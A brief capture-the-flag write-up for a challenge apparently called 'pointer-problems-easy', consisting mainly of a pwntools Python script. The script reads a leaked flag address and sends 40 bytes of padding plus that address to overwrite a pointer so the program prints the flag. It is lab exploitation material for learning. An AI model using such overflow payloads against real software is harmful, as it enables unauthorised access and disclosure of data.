![](img/Pointer%20Problems-1780479450320.webp)

the program give us the location of the flag, and the location of the print address
just replace the char* at the given address with the address of the flag

```
#!/usr/bin/python3 
from pwn import * 
import re 

context.log_level='debug' 

p=process("/challenge/pointer-problems-easy") 

p.sendline(b"100") 
out=p.recvuntil(b"Payload size: Send your payload").decode() 
z=re.search('The flag is located at (0x[0-9a-f]+)', out) 
payload=b"A"*40 
if(z): 
	payload+=p64(int(z.group(1),16)) 
	p.sendline(payload) 
p.interactive()
```